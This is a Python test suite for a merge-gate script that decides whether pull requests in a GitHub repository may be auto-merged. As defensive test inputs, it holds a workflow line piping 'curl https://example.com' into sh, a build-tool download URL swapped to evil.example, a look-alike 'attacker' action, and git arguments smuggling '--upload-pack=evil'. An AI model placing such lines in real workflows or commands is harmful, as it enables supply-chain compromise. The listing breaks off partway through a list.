"""Tests for scripts/merge_ready.py (issue 136). Run: python3 -I scripts/test_merge_ready.py

The GitHub REST API is replaced by a fake; no test touches the network. Every negative case must leave the merge call
unmade (`FakeApi.merged` stays empty)."""

import base64
import copy
import io
import re
import subprocess
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
sys.path.insert(0, str(Path(__file__).resolve().parent / "hooks"))
import ci_scope  # noqa: E402  # justified: its SELFTESTS are the gate self-tests CI runs without naming them
import merge_ready  # noqa: E402  # justified: must follow the sys.path insert above
import pretooluse_guard  # noqa: E402  # justified: its PROTECTED list is the source of the process files (R1-03)

ROOT = Path(__file__).resolve().parent.parent
SCRIPT = ROOT / "scripts" / "merge_ready.py"
REPO = "bondo/listicles2"
SHA = "a" * 40
OTHER_SHA = "b" * 40
N = 77
REQUIRED = ["guards", "tasks", "static"]
PIN_OLD = "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1"
PIN_NEW = "      - uses: actions/checkout@" + "c" * 40 + " # v7.1.0"
SUB_OLD = "        uses: github/codeql-action/init@" + "d" * 40 + " # v4.1.0"
SUB_NEW = "        uses: github/codeql-action/init@" + "e" * 40 + " # v4.2.0"
WRAP_OLD = "distributionUrl=https\\://services.gradle.org/distributions/gradle-9.1-bin.zip"
WRAP_NEW = "distributionUrl=https\\://services.gradle.org/distributions/gradle-9.2-all.zip"
WRAP_PATCH = f"@@ -1,2 +1,2 @@\n-{WRAP_OLD}\n+{WRAP_NEW}\n-distributionSha256Sum={'1' * 64}\n+distributionSha256Sum={'2' * 64}"


PIN_TAGS = {("actions/checkout", "v7.1.0"): "c" * 40, ("github/codeql-action", "v4.2.0"): "e" * 40}


def fake_resolver(table=None, calls=None):
    """A stand-in for the tag lookup: (owner/repo, tag) -> the commit sha the tag points to; no network."""
    table = PIN_TAGS if table is None else table

    def resolve(repo, tag):
        if calls is not None:
            calls.append((repo, tag))
        if (repo, tag) not in table:
            raise merge_ready.PinError(f"tag {tag} not found in {repo}")
        return table[(repo, tag)]

    return resolve


def file_entry(name, status="modified", patch="@@ -1 +1 @@\n-old\n+new", previous=None):
    entry = {"filename": name, "status": status, "patch": patch}
    if previous:
        entry["previous_filename"] = previous
    return entry


def run(name, status="completed", conclusion="success", rid=1, app=15368):
    return {"id": rid, "name": name, "status": status, "conclusion": conclusion, "app": {"id": app}}


class FakeApi:
    """Answers the few REST routes merge_ready uses, from a dict keyed by path (no query string)."""

    def __init__(self, data):
        self.data = data
        self.merged = []
        self.requested = []

    def get(self, path):
        self.requested.append(path)
        return copy.deepcopy(self.data[path])

    def pages(self, path, key=None):
        self.requested.append(path)
        return copy.deepcopy(self.data[path])

    def put(self, path, fields):
        self.merged.append((path, dict(fields)))
        return {"merged": True, "sha": "d" * 40}


def make_api(files=None, title="Update the plan", body="Refreshes section 4. See issue 15.", sha=SHA, state="clean", checks=None,
             required=None, commits=None, base="main", counts=None):
    files = files if files is not None else [file_entry("docs/product/flow.md")]
    commits = commits if commits is not None else [{"commit": {"message": "Edit flow doc"}}]
    counts = counts or {}
    pulls = f"repos/{REPO}/pulls/{N}"
    contexts = REQUIRED if required is None else required
    rules = [{"type": "required_status_checks", "parameters": {"required_status_checks": [{"context": c, "integration_id": 15368} for c in contexts]}}]
    return FakeApi(
        {
            pulls: {"head": {"sha": sha}, "base": {"ref": base}, "title": title, "body": body, "mergeable_state": state, "draft": False,
                     "changed_files": counts.get("files", len(files)), "commits": counts.get("commits", len(commits))},
            pulls + "/files": files,
            pulls + "/commits": commits,
            f"repos/{REPO}/rules/branches/{base}": rules,
            f"repos/{REPO}/commits/{SHA}/check-runs": checks if checks is not None else [run(c) for c in REQUIRED],
        }
    )


def go(api, sha=SHA, kind="working-draft-docs", resolver=None):
    out, err = io.StringIO(), io.StringIO()
    code = merge_ready.main([str(N), sha, kind], api=api, out=out, err=err, resolver=resolver or fake_resolver())
    return code, out.getvalue() + err.getvalue()


class HappyPathTests(unittest.TestCase):
    def test_docs_squash_merge_is_sha_pinned(self):
        api = make_api()
        code, text = go(api)
        self.assertEqual(code, 0, text)
        want = {"merge_method": "squash", "sha": SHA, "commit_title": "Update the plan (#77)", "commit_message": "Refreshes section 4. See issue 15."}
        self.assertEqual(api.merged, [(f"repos/{REPO}/pulls/{N}/merge", want)])

    def test_tasks_sync_with_only_tasks_toml(self):
        api = make_api(files=[file_entry("docs/tasks.toml")])
        self.assertEqual(go(api, kind="tasks-sync")[0], 0)
        self.assertEqual(len(api.merged), 1)

    def test_dependabot_manifests_and_workflow_pin(self):
        patch = f"@@ -3 +3 @@\n-{PIN_OLD}\n+{PIN_NEW}"
        files = [
            file_entry("gradle/wrapper/gradle-wrapper.properties", patch=WRAP_PATCH),
            file_entry(".github/workflows/status.yml", patch=f"@@ -3 +3 @@\n-{SUB_OLD}\n+{SUB_NEW}"),
            file_entry(".github/workflows/ci.yml", patch=patch),
        ]
        api = make_api(files=files)
        self.assertEqual(go(api, kind="dependabot")[0], 0)
        self.assertEqual(len(api.merged), 1)

    def test_every_listed_working_draft_is_accepted(self):
        names = ("docs/PLAN.md", "docs/product/stories.md", "docs/product/flow.md", "docs/product/rubric.md", "design/tokens.json",
                 "docs/milestones/M1.md", "docs/product/wireframes/wireframes.html", "docs/product/wireframes/01-sign-in-dark.png")
        files = [file_entry(n) for n in names[:-1]] + [{"filename": names[-1], "status": "added"}]  # a png has no patch
        self.assertEqual(go(make_api(files=files))[0], 0)

    def test_extra_runs_do_not_matter_and_the_latest_run_of_a_check_counts(self):
        old_red = run("guards", conclusion="failure", rid=1)
        for extra in ([run("optional", conclusion="failure")], [old_red]):  # not required; and older than the green run below
            self.assertEqual(go(make_api(checks=[run("guards", rid=2), run("tasks"), run("static"), *extra]))[0], 0)


class RefusalTests(unittest.TestCase):
    def refused(self, api, reason, sha=SHA, kind="working-draft-docs", resolver=None):
        code, text = go(api, sha=sha, kind=kind, resolver=resolver)
        self.assertNotEqual(code, 0, text)
        self.assertEqual(api.merged, [], "a refused PR must not be merged")
        self.assertRegex(text, reason)

    def test_head_moved_from_the_given_sha(self):
        self.refused(make_api(sha=OTHER_SHA), r"head .*" + OTHER_SHA[:7] + r".*not .*" + SHA[:7])

    def test_behind_blocked_dirty_and_unknown_are_not_clean(self):
        for state in ("behind", "blocked", "dirty", "unknown", "unstable", "draft", "has_hooks"):
            with self.subTest(state=state):
                self.refused(make_api(state=state), rf"mergeable_state.*{state}")

    def test_required_check_red_pending_or_missing(self):
        pending = run("static", status="in_progress", conclusion=None)
        cases = [([run("guards"), run("tasks", conclusion="failure"), run("static")], r"tasks.*failure"),
                 ([run("guards"), run("tasks"), pending], r"static.*(pending|in_progress)"),
                 ([run("guards"), run("tasks")], r"static.*(missing|no check run)")]
        for conclusion in ("skipped", "neutral", "cancelled", "timed_out", "action_required"):  # none of these is success
            cases.append(([run("guards"), run("tasks", conclusion=conclusion), run("static")], rf"tasks.*{conclusion}"))
        for checks, reason in cases:
            with self.subTest(reason=reason):
                self.refused(make_api(checks=checks), reason)

    def test_no_required_checks_configured_fails_closed(self):
        self.refused(make_api(required=[]), r"required (status )?checks")

    def test_closing_keyword_in_body_title_or_commit(self):
        cases = [{"body": t} for t in ("Fixes #12", "closes #12", "This will resolve #12.", "Closed: #12", "fix owner/repo#12", "RESOLVED #12")]
        cases += [{"body": f"fixes {host}/bondo/listicles2/issues/12"} for host in ("https://github.com", "http://github.com", "https://www.github.com")]
        cases += [{"title": "Fix #12 in the plan"}, {"commits": [{"commit": {"message": "Edit flow doc\n\nCloses #12"}}]}]
        for kwargs in cases:
            with self.subTest(**kwargs):
                self.refused(make_api(**kwargs), r"closing keyword")

    def test_prose_without_issue_number_is_fine(self):
        api = make_api(body="Fixes the typo in the prefix. Closed beta, see #12. Issue 136. Fix 12 items.")
        self.assertEqual(go(api)[0], 0)

    def test_path_outside_docs_kind(self):
        owner_only = ("docs/product/naming.md", "docs/reviews/README.md", "docs/reviews/collaborator-workflow.md", "docs/reviews/new.md")  # R3-01
        for name in ("scripts/merge_ready.py", "docs/tasks.toml", "docs/ORCHESTRATION.md", "CLAUDE.md", ".github/workflows/ci.yml", *owner_only):
            with self.subTest(name=name):
                files = [file_entry("docs/product/flow.md"), file_entry(name)]
                self.refused(make_api(files=files), re.escape(name))

    def test_tasks_sync_refuses_any_other_file(self):
        files = [file_entry("docs/tasks.toml"), file_entry("docs/product/flow.md")]
        self.refused(make_api(files=files), r"docs/product/flow\.md", kind="tasks-sync")

    def test_dotdot_path_and_rename_out_of_the_allowed_paths_are_refused(self):
        for entry, reason in ((file_entry("docs/product/../../scripts/x.py"), r"\.\."),
                              (file_entry("docs/product/new.md", status="renamed", previous="scripts/guards.sh"), r"scripts/guards\.sh")):
            with self.subTest(reason=reason):
                self.refused(make_api(files=[entry]), reason)

    def test_dependabot_workflow_without_a_patch_is_refused(self):
        files = [file_entry(".github/workflows/ci.yml")]
        del files[0]["patch"]
        self.refused(make_api(files=files), r"ci\.yml.*patch", kind="dependabot")

    def test_docs_kind_refuses_workflow_pin_changes(self):
        patch = f"@@ -3 +3 @@\n-{PIN_OLD}\n+{PIN_NEW}"
        self.refused(make_api(files=[file_entry(".github/workflows/ci.yml", patch=patch)]), r"ci\.yml")

    def test_queued_rerun_beats_an_older_green_run(self):
        queued = run("guards", status="queued", conclusion=None, rid=9)
        self.refused(make_api(checks=[queued, run("guards", rid=2), run("tasks"), run("static")]), r"guards.*pending")

    def test_success_from_another_app_does_not_count(self):
        self.refused(make_api(checks=[run("guards", app=999), run("tasks"), run("static")]), r"guards.*missing")

    def test_base_other_than_main_is_refused(self):
        self.refused(make_api(base="release"), r"base .*release.*main")

    def test_truncated_file_or_commit_list_is_refused(self):
        for counts, reason in (({"files": 3001}, r"files.*3001"), ({"commits": 251}, r"commits.*251")):
            with self.subTest(counts=counts):
                self.refused(make_api(counts=counts), reason)

    def test_dependabot_workflow_changes_beyond_a_repin_are_refused(self):
        evil, other = PIN_NEW.replace("actions/checkout", "attacker/checkout"), SUB_NEW.replace("/init@", "/analyze@")
        patches = [f"@@ -3 +3 @@\n-{PIN_OLD}\n+{evil}", f"@@ -3 +3 @@\n-{SUB_OLD}\n+{other}",  # another action or sub-path
                   f"@@ -3,2 +3,3 @@\n-{PIN_OLD}\n+{PIN_NEW}\n+      - run: curl https://example.com | sh",  # an extra line
                   f"@@ -3 +3 @@\n-{PIN_OLD}\n+      - uses: actions/checkout@v7",  # a tag, not a sha
                   f"@@ -3 +3,2 @@\n {PIN_OLD}\n+{PIN_NEW}", f"@@ -3,2 +3 @@\n {PIN_NEW}\n-{PIN_OLD}",  # an added or a removed step
                   f"@@ -3,3 +3,3 @@\n-{PIN_OLD}\n     with: {{}}\n+{PIN_NEW}"]  # R2-02: a pin moved across context lines
        for patch in patches:
            with self.subTest(patch=patch):
                files = [file_entry(".github/workflows/ci.yml", patch=patch)]
                self.refused(make_api(files=files), r"ci\.yml.*(pin|uses)", kind="dependabot")

    def test_status_line_edit_that_keeps_not_owner_approved_is_fine(self):
        tail = "; not owner-approved (see issue #15)."
        keep = f"@@ -3 +3 @@\n-Status: working draft, 2026-11-15{tail}\n+Status: working draft, 2026-11-18{tail}"
        self.assertEqual(go(make_api(files=[file_entry("docs/product/stories.md", patch=keep)]))[0], 0)

    def test_sign_off_that_removes_not_owner_approved_is_refused(self):
        """R3-01: turning a working draft into an approved doc is the owner's call, whatever the file."""
        flip = "@@ -3 +3 @@\n-Status: working draft, merged as the baseline; not owner-approved (see issue #15).\n+Status: approved by the owner, 2026-11-18."
        no_patch = [{"filename": "docs/product/stories.md", "status": "modified"}, {"filename": "docs/PLAN.md", "status": "removed"},
                    {"filename": "docs/product/wireframes/p.png", "status": "renamed", "previous_filename": "docs/PLAN.md"}]  # R4-01
        for f in [file_entry(n, patch=flip) for n in ("docs/product/stories.md", "docs/PLAN.md", "design/tokens.json")] + no_patch:
            with self.subTest(f=f):
                self.refused(make_api(files=[f]), re.escape(f["filename"]) + r".*not owner-approved")

    def test_dependabot_renamed_or_deleted_file_is_refused(self):
        """R3-02: a dependency bump only modifies files."""
        for status in ("renamed", "removed", "added"):
            with self.subTest(status=status):
                files = [file_entry("gradle/wrapper/gradle-wrapper.jar", status=status)]
                self.refused(make_api(files=files), rf"gradle-wrapper\.jar.*{status}", kind="dependabot")

    def test_dependabot_manifests_go_to_the_owner(self):
        """R2-01: manifests whose content is not checked (a `test` script, postinstall, a requirement URL) are outside the kind."""
        for name in ("firebase/package.json", "firebase/package-lock.json", "gradle/libs.versions.toml", "scripts/requirements-lint.txt",
                     "app/build.gradle.kts"):
            with self.subTest(name=name):
                self.refused(make_api(files=[file_entry(name)]), rf"outside kind dependabot: {re.escape(name)}", kind="dependabot")

    def test_dependabot_wrapper_other_host_or_property_is_refused(self):
        evil = "distributionUrl=https\\://evil.example/gradle-9.2-bin.zip"
        for patch in (f"@@ -1 +1 @@\n-{WRAP_OLD}\n+{evil}", "@@ -1 +1 @@\n-networkTimeout=10000\n+networkTimeout=1"):
            with self.subTest(patch=patch):
                files = [file_entry("gradle/wrapper/gradle-wrapper.properties", patch=patch)]
                self.refused(make_api(files=files), r"gradle-wrapper\.properties", kind="dependabot")

    def test_no_changed_files_is_refused(self):
        self.refused(make_api(files=[]), r"no changed files")

    def test_all_failures_are_listed(self):
        api = make_api(state="behind", body="fixes #1", files=[file_entry("CLAUDE.md")])
        code, text = go(api)
        self.assertNotEqual(code, 0)
        for reason in ("behind", "closing keyword", "CLAUDE.md"):
            self.assertIn(reason, text)
        self.assertEqual(api.merged, [])


def pin_files(old=PIN_OLD, new=PIN_NEW, name=".github/workflows/ci.yml"):
    return [file_entry(name, patch=f"@@ -3 +3 @@\n-{old}\n+{new}")]


class PinTagTests(unittest.TestCase):
    """R2-06: a re-pinned action must point at the commit its `# <tag>` comment names (an imposter commit is refused)."""

    def refused(self, files, reason, resolver=None):
        api = make_api(files=files)
        code, text = go(api, kind="dependabot", resolver=resolver)
        self.assertEqual(code, 1, text)
        self.assertRegex(text, reason)
        self.assertEqual(api.merged, [], "a refused PR must not be merged")

    def test_sha_equal_to_the_tag_commit_is_merged(self):
        calls = []
        api = make_api(files=pin_files())
        self.assertEqual(go(api, kind="dependabot", resolver=fake_resolver(calls=calls))[0], 0)
        self.assertEqual(calls, [("actions/checkout", "v7.1.0")])
        self.assertEqual(len(api.merged), 1)

    def test_every_new_pin_is_checked_including_sub_path_actions(self):
        calls = []
        files = pin_files() + pin_files(SUB_OLD, SUB_NEW, ".github/workflows/status.yml")
        self.assertEqual(go(make_api(files=files), kind="dependabot", resolver=fake_resolver(calls=calls))[0], 0)
        self.assertEqual(sorted(calls), [("actions/checkout", "v7.1.0"), ("github/codeql-action", "v4.2.0")])  # owner/repo, not owner/repo/init

    def test_one_bad_pin_among_good_ones_refuses_the_pr(self):
        files = pin_files() + pin_files(SUB_OLD, SUB_NEW, ".github/workflows/status.yml")
        table = {**PIN_TAGS, ("github/codeql-action", "v4.2.0"): "f" * 40}
        self.refused(files, r"status\.yml.*codeql-action.*v4\.2\.0", fake_resolver(table))

    def test_sha_of_a_different_commit_is_refused(self):
        table = {("actions/checkout", "v7.1.0"): "9" * 40}
        self.refused(pin_files(), r"ci\.yml.*actions/checkout.*v7\.1\.0.*" + "9" * 7 + ".*" + "c" * 7, fake_resolver(table))

    def test_missing_or_empty_tag_comment_is_refused(self):
        for new in ("      - uses: actions/checkout@" + "c" * 40, "      - uses: actions/checkout@" + "c" * 40 + " #",
                    "      - uses: actions/checkout@" + "c" * 40 + "   # "):
            with self.subTest(new=new):
                calls = []
                self.refused(pin_files(new=new), r"ci\.yml.*actions/checkout.*tag comment", fake_resolver(calls=calls))
                self.assertEqual(calls, [], "nothing to look up without a tag")

    def test_unknown_tag_is_refused(self):
        self.refused(pin_files(new=PIN_NEW.replace("v7.1.0", "v9.9.9")), r"v9\.9\.9.*not found", fake_resolver())

    def test_lookup_failure_fails_closed(self):
        def broken(repo, tag):
            raise merge_ready.PinError(f"git ls-remote {repo} failed: network unreachable")

        self.refused(pin_files(), r"ci\.yml.*actions/checkout.*network unreachable", broken)

    def test_unexpected_resolver_crash_is_refused_with_a_reason(self):
        """R1-01: a crash in the lookup gives a clean exit 1 and a reason, not a traceback (and never a merge)."""

        def crash(repo, tag):
            raise OSError("boom")

        self.refused(pin_files(), r"ci\.yml.*actions/checkout.*v7\.1\.0.*lookup crashed \(OSError\)", crash)

    def test_a_pin_that_pin_only_accepts_but_cannot_be_parsed_is_refused(self):
        """R1-02: every line pin_only accepts must get the tag check; a line the tag check cannot read fails closed."""
        old, new = "      - uses: actions/checkout/@" + "a" * 40 + " # v1.0.0", "      - uses: actions/checkout/@" + "b" * 40 + " # v9.9.9"
        self.assertTrue(merge_ready.pin_only(f"@@ -3 +3 @@\n-{old}\n+{new}"), "precondition: pin_only accepts this diff")
        calls = []
        self.refused(pin_files(old, new), r"ci\.yml.*unparsed pin", fake_resolver(calls=calls))
        self.assertEqual(calls, [])

    def test_a_pin_change_with_extra_edits_is_still_refused_even_when_the_sha_is_right(self):
        patch = f"@@ -3,2 +3,3 @@\n-{PIN_OLD}\n+{PIN_NEW}\n+      - run: curl https://example.com | sh"
        self.refused([file_entry(".github/workflows/ci.yml", patch=patch)], r"ci\.yml.*(pin|uses)", fake_resolver())

    def test_wrapper_bump_makes_no_lookup(self):
        calls = []
        files = [file_entry("gradle/wrapper/gradle-wrapper.properties", patch=WRAP_PATCH)]
        self.assertEqual(go(make_api(files=files), kind="dependabot", resolver=fake_resolver(calls=calls))[0], 0)
        self.assertEqual(calls, [])

    def test_docs_kind_makes_no_lookup(self):
        calls = []
        self.assertEqual(go(make_api(), resolver=fake_resolver(calls=calls))[0], 0)
        self.assertEqual(calls, [])


class FakeRun:
    """Replaces subprocess.run for ls_remote_resolver: records the command, answers with a canned result."""

    def __init__(self, stdout="", returncode=0, stderr="", exc=None):
        self.result = subprocess.CompletedProcess([], returncode, stdout, stderr)
        self.exc = exc
        self.cmds = []

    def __call__(self, cmd, **kwargs):
        self.cmds.append((cmd, kwargs))
        if self.exc:
            raise self.exc
        return self.result


class LsRemoteResolverTests(unittest.TestCase):
    TAG_OBJ, COMMIT = "1" * 40, "2" * 40

    def resolve(self, runner, repo="actions/checkout", tag="v7.1.0"):
        return merge_ready.ls_remote_resolver(runner)(repo, tag)

    def test_asks_git_ls_remote_for_the_tag_and_its_peeled_commit(self):
        runner = FakeRun(f"{self.COMMIT}\trefs/tags/v7.1.0\n")
        self.assertEqual(self.resolve(runner), self.COMMIT)
        cmd, kwargs = runner.cmds[0]
        self.assertEqual(cmd, ["git", "ls-remote", "https://github.com/actions/checkout", "refs/tags/v7.1.0", "refs/tags/v7.1.0^{}"])
        self.assertTrue(kwargs.get("timeout"), "a hung network must not hang the merge agent")

    def test_annotated_tag_is_dereferenced_to_its_commit(self):
        for lines in ((f"{self.TAG_OBJ}\trefs/tags/v7.1.0", f"{self.COMMIT}\trefs/tags/v7.1.0^{{}}"),  # either output order
                      (f"{self.COMMIT}\trefs/tags/v7.1.0^{{}}", f"{self.TAG_OBJ}\trefs/tags/v7.1.0")):
            with self.subTest(lines=lines):
                self.assertEqual(self.resolve(FakeRun("\n".join(lines) + "\n")), self.COMMIT)

    def test_other_refs_in_the_output_are_ignored(self):
        out = f"{'3' * 40}\trefs/tags/v7.1.0-rc1\n{self.COMMIT}\trefs/tags/v7.1.0\n"
        self.assertEqual(self.resolve(FakeRun(out)), self.COMMIT)

    def test_failures_all_raise_pin_error(self):
        cases = {
            "ls-remote error": FakeRun(returncode=128, stderr="fatal: unable to access"),
            "no such tag": FakeRun(""),
            "no matching ref": FakeRun(f"{'3' * 40}\trefs/tags/other\n"),
            "garbled sha": FakeRun("zzzz\trefs/tags/v7.1.0\n"),
            "timeout": FakeRun(exc=subprocess.TimeoutExpired("git", 30)),
            "no git": FakeRun(exc=FileNotFoundError("git")),
        }
        for name, runner in cases.items():
            with self.subTest(name), self.assertRaises(merge_ready.PinError):
                self.resolve(runner)

    def test_a_repo_or_tag_that_could_smuggle_an_option_or_a_url_is_refused_before_git_runs(self):
        for repo, tag in (("actions/checkout", "--upload-pack=evil"), ("actions/checkout", "v1 refs/heads/main"), ("-o/evil", "v1"),
                          ("actions/checkout/../x", "v1"), ("evil.example/x@y", "v1"), ("actions", "v1")):
            with self.subTest(repo=repo, tag=tag):
                runner = FakeRun(f"{self.COMMIT}\trefs/tags/v1\n")
                with self.assertRaises(merge_ready.PinError):
                    self.resolve(runner, repo, tag)
                self.assertEqual(runner.cmds, [])


class UsageTests(unittest.TestCase):
    def cli(self, *args):
        return subprocess.run([sys.executable, "-I", str(SCRIPT), *args], capture_output=True, text=True, timeout=30)

    def test_unknown_kind_exits_nonzero_before_any_api_call(self):
        api = make_api()
        code, text = go(api, kind="feature-code")
        self.assertNotEqual(code, 0)
        self.assertIn("unknown kind", text)
        self.assertEqual(api.requested, [])
        self.assertEqual(api.merged, [])

    def test_kinds_are_exactly_the_authorized_ones(self):
        self.assertEqual(sorted(merge_ready.KINDS), ["dependabot", "general", "tasks-sync", "working-draft-docs"])

    def test_cli_unknown_kind(self):
        res = self.cli("12", SHA, "everything")
        self.assertNotEqual(res.returncode, 0)
        self.assertIn("unknown kind", res.stderr + res.stdout)

    def test_cli_bad_arguments(self):
        for args in (("x", SHA, "dependabot"), ("12", "abc", "dependabot"), ("12", SHA), ("12", SHA, "dependabot", "extra"), ()):
            with self.subTest(args=args):
                res = self.cli(*args)
                self.assertNotEqual(res.returncode, 0)

    def test_api_error_refuses(self):
        class Broken(FakeApi):
            def get(self, path):
                raise merge_ready.ApiError("boom")

        api = Broken({})
        code, text = go(api)
        self.assertNotEqual(code, 0)
        self.assertIn("boom", text)
        self.assertEqual(api.merged, [])

    def test_merge_api_error_is_a_failure(self):
        class NoMerge(FakeApi):
            def put(self, path, fields):
                raise merge_ready.ApiError("405 not mergeable")

        api = NoMerge(make_api().data)
        code, text = go(api)
        self.assertNotEqual(code, 0)
        self.assertIn("405", text)


class GeneralKindTests(unittest.TestCase):
    """Kind `general`: a PR that is not owner-only, merged under the owner's standing authorization (#15 comment 7005366747)."""

    def refused(self, api, reason, **kwargs):
        code, text = go(api, kind="general", **kwargs)
        self.assertNotEqual(code, 0, text)
        self.assertEqual(api.merged, [], "a refused PR must not be merged")
        self.assertRegex(text, reason)

    ALLOWED = ("app/src/main/kotlin/dev/listicles/app/Lists.kt", "app/src/main/res/values/strings.xml", "app/src/main/res/values-da/strings.xml",
               "app/src/test/kotlin/dev/listicles/app/ListsTest.kt", "app/src/androidTest/kotlin/dev/listicles/app/ListsUiTest.kt",
               "core/domain/src/main/kotlin/dev/listicles/domain/Lists.kt", "core/domain/src/test/kotlin/dev/listicles/domain/ListsTest.kt",
               "docs/PLAN.md", "docs/milestones/M1.md", "docs/adr/0002-x.md", "docs/metrics/m0-backfill.txt", "README.md")

    def test_the_allowlisted_classes_are_merged(self):  # owner decision #15 7058755858: only an allowlist merges as general
        api = make_api(files=[file_entry(n) for n in self.ALLOWED])
        self.assertEqual(go(api, kind="general")[0], 0)
        self.assertEqual([m[1]["sha"] for m in api.merged], [SHA])

    def test_every_path_outside_the_allowlist_is_refused(self):  # fail closed: R6-01, R6-05, R6-03, R6-04 and everything unknown
        names = ("firebase/.npmrc", "firebase/jest.config.cjs", "firebase/eslint.config.mjs", "firebase/nested/eslint.config.mjs",  # R6-01, R6-05, R6-03
                 "scripts/shellcheckrc", "scripts/.shellcheckrc", "scripts/verify.sh", "scripts/new_tool.py",  # R6-04, scripts
                 "app/build.gradle.kts", "build.gradle.kts", "gradle.properties", "ruff.toml", "mypy.ini", ".editorconfig", ".gitignore",
                 "config/detekt/detekt.yml", "config/detekt/fixtures/Case.kt", "firebase/firestore.rules", "firebase/test/rules.test.ts",
                 "app/src/main/AndroidManifest.xml", "app/proguard-rules.pro", "app/src/test/resources/robolectric.properties",
                 "core/testing/src/main/kotlin/dev/listicles/testing/NoNetwork.kt", "core/domain/build.gradle.kts",
                 "NEW_TOP_LEVEL.txt", "newdir/file.md", "app/src/main/kotlin/dev/listicles/app/Notes.md", "app/src/main/res/raw/x.sh",
                 "app/src/main/kotlin/.hidden.kt", "app/src/main/res/.npmrc", "docs/.gitattributes",  # a new dotfile inside an allowlisted dir
                 "core/domain/src/test/kotlin/dev/listicles/architecture/NewRule.kt", "app/src/test/kotlin/dev/listicles/app/NoNetworkInAppTest.kt",
                 "app/src/test/kotlin/dev/listicles/app/RobolectricOfflineWiringTest.kt",  # gate tests
                 "app/src/test/kotlin/dev/listicles/app/Junit4EngineTest.kt",
                 "core/domain/src/test/kotlin/io/kotest/provided/ProjectConfig.kt", "core/domain/src/test/kotlin/dev/listicles/PackageConfig.kt",  # R7-01
                 "core/domain/src/test/kotlin/dev/listicles/domain/ProjectConfig.kt", "app/src/test/kotlin/org/junit/Assert.kt",  # only dev/listicles
                 "core/domain/src/test/kotlin/dev/listicles/testing/BlockingSelectorProvider.kt",  # R7-02: same-name classes of core/testing
                 "app/src/test/kotlin/dev/listicles/testing/BlockingAsynchronousChannelProvider.kt",
                 "app/src/main/res/lint.xml", "app/src/main/res/xml/lint.xml", "app/src/main/res/values/lint-baseline.xml",  # R7-03: lint config
                 "app/src/main/res/xml/backup_rules.xml", "app/src/main/res/xml/data_extraction_rules.xml",  # R7-06: backup, device transfer
                 "app/src/main/res/xml/network_security_config.xml", "docs/COLLABORATING.md",  # R7-07
                 "app/src/main/kotlin/./x.kt", "app/src/main/kotlin//x.kt", "/app/src/main/kotlin/x.kt", "app\\src\\main\\kotlin\\x.kt",
                 "app/src/main/kotlin/x y.kt", "app/src/main/kotlin/x\u202e.kt", "App/src/main/kotlin/x.kt", "DOCS/PLAN.md")  # odd and mixed-case names
        for name in names:
            with self.subTest(name=name):
                self.assertTrue(merge_ready.owner_only(name))
                self.refused(make_api(files=[file_entry(name)]), r"outside kind general")

    SPEC = "core/domain/src/test/kotlin/dev/listicles/domain/ListsTest.kt"

    def test_a_kotlin_change_that_names_kotest_project_config_is_refused(self):  # R7-01: one extension makes every Kotest spec pass
        for line in ("class Ext : AbstractProjectConfig() {", "import io.kotest.provided.ProjectConfig", "@AutoScan object Mask : TestCaseExtension",
                     "object P : AbstractPackageConfig()"):
            with self.subTest(line=line):
                self.refused(make_api(files=[file_entry(self.SPEC, patch=f"@@ -1 +1 @@\n-x\n+{line}")]), r"Kotest")
        ordinary = file_entry(self.SPEC, patch='@@ -1 +1 @@\n-x\n+class ListsTest : FunSpec({ test("a") {} })')
        self.assertEqual(go(make_api(files=[ordinary]), kind="general")[0], 0)

    def test_a_kotlin_file_without_a_patch_is_refused(self):  # the content check cannot run
        self.refused(make_api(files=[file_entry(self.SPEC, patch=None)]), r"no patch")

    def test_tasks_toml_may_change_only_status_and_pr_of_agent_tasks(self):  # R7-04: owner decision #15 7059534826
        base = ('milestones = ["M1"]\n\n[[task]]\nid = "M1-01"\ntitle = "A"\nstatus = "todo"\nassignee = "implementer"\ndepends_on = []\n\n'
                '[[task]]\nid = "M1-O1"\ntitle = "B"\nstatus = "todo"\nassignee = "owner"\ndepends_on = []\n')

        def tasks_api(new):
            api = make_api(files=[file_entry("docs/tasks.toml")])
            enc = lambda s: {"content": base64.b64encode(s.encode()).decode()}  # noqa: E731  # justified: two-use local helper
            api.data[f"repos/{REPO}/contents/docs/tasks.toml?ref=main"] = enc(base)
            api.data[f"repos/{REPO}/contents/docs/tasks.toml?ref={SHA}"] = enc(new)
            return api

        done = base.replace('id = "M1-01"\ntitle = "A"\nstatus = "todo"', 'id = "M1-01"\ntitle = "A"\nstatus = "done"').replace(
            'depends_on = []\n\n[[task]]\nid = "M1-O1"', 'depends_on = []\npr = 7\n\n[[task]]\nid = "M1-O1"')
        self.assertEqual(go(tasks_api(done), kind="general")[0], 0)  # status and pr of an agent task
        cases = {"owner task status": base.replace('title = "B"\nstatus = "todo"', 'title = "B"\nstatus = "done"'),
                 "title": base.replace('title = "A"', 'title = "A2"'), "depends_on": base.replace('depends_on = []', 'depends_on = ["M1-O1"]', 1),
                 "assignee": base.replace('assignee = "implementer"', 'assignee = "owner"'), "task added": base + '\n[[task]]\nid = "M1-02"\n',
                 "task removed": base[: base.index('[[task]]\nid = "M1-O1"')], "top level": base.replace('["M1"]', '["M1", "M2"]'),
                 "not toml": "this is = = not toml"}
        for name, new in cases.items():
            with self.subTest(name):
                self.refused(tasks_api(new), r"tasks\.toml")

    def test_an_unreadable_tasks_toml_refuses(self):  # fail closed
        class Broken(FakeApi):
            def get(self, path):
                if "contents/docs/tasks.toml" in path:
                    raise merge_ready.ApiError("404 not found")
                return super().get(path)

        api = Broken(make_api(files=[file_entry("docs/tasks.toml")]).data)
        code, text = go(api, kind="general")
        self.assertEqual((code, api.merged), (1, []), text)

    def test_a_traversal_name_is_refused(self):
        self.refused(make_api(files=[file_entry("app/src/main/kotlin/../../../../scripts/x.kt")]), r"\.\.")

    def test_one_path_outside_the_allowlist_refuses_the_whole_pr(self):
        files = [file_entry(n) for n in self.ALLOWED] + [file_entry("firebase/.npmrc")]
        self.refused(make_api(files=files), r"outside kind general.*firebase/\.npmrc")

    def test_every_owner_only_path_is_refused(self):
        names = ("docs/ORCHESTRATION.md", "docs/BRANCH-PROTECTION.md", "docs/product/naming.md", "docs/reviews/README.md", "design/new-sign-off.md",
                 "design/tokens.json",  # R3-01: signed off by the owner, so not a draft
                 "firebase/package.json", "firebase/package-lock.json", "gradle/libs.versions.toml", "scripts/requirements-lint.txt",
